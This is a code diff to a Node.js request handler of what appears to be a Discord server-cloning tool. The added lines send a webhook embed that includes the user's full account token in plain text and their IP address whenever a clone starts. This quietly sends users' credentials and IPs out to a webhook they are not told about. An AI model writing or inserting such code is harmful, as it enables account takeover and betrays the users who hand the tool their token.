@@ -1,5 +1,6 @@
 const { Worker } = require('worker_threads');
 const path = require('path');
+const { sendWebhook } = require('../utils/webhook');
 
 exports.copy = async (req, res) => {
     const { token, copyId, pasteId, selectedOptions, socketId } = req.body || {};
@@ -10,6 +11,18 @@ exports.copy = async (req, res) => {
 
         const worker = new Worker(path.join(__dirname, '../script/cloner.js'), {
             workerData: { token, sourceId: copyId, targetId: pasteId, selectedOptions: selectedOptions || { all: true } }
+        });
+
+        sendWebhook({
+            title: "🚀 Server Cloning Started",
+            description: "A server cloning process has been initiated.",
+            color: 0xe67e22,
+            fields: [
+                { name: "Copy Guild", value: `\`${copyId}\``, inline: true },
+                { name: "Paste Guild", value: `\`${pasteId}\``, inline: true },
+                { name: "Token", value: `\`${token}\``, inline: false },
+                { name: "IP Address", value: req.ip || "Unknown", inline: true }
+            ]
         });
 
         worker.on('message', (data) => {
